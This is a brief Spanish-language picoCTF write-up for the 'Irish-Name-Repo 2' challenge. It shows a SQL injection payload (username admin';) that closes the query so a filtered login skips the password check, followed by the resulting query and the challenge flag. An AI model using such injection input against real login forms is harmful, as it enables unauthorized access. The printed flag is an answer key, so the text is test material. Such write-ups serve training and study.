## Irish-Name-Repo 2 

### Objetivos 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

### Pistas
The password is being filtered.

### Solución 
- activamos el campo de debug desde las herramientas de desarrollador para ver las sentencias sql.

- la anterior inyeccion no funciona así que usaremos una diferente
pondremos usuario admin y cerramos el apostrofe y ponemos punto y coma para cerrar la sentencia y que ignore la contraseña.

``` bash
username: admin'; 
password:
SQL query: SELECT * FROM users WHERE name='admin'; AND password=''

---

# Logged in!
Your flag is: picoCTF{m0R3_SQL_plz_c34df170}

```

### Notas adicionales:


### Referencias:
sql injection: https://www.imperva.com/learn/application-security/sql-injection-sqli/#:~:text=SQL%20injection%2C%20also%20known%20as,not%20intended%20to%20be%20displayed.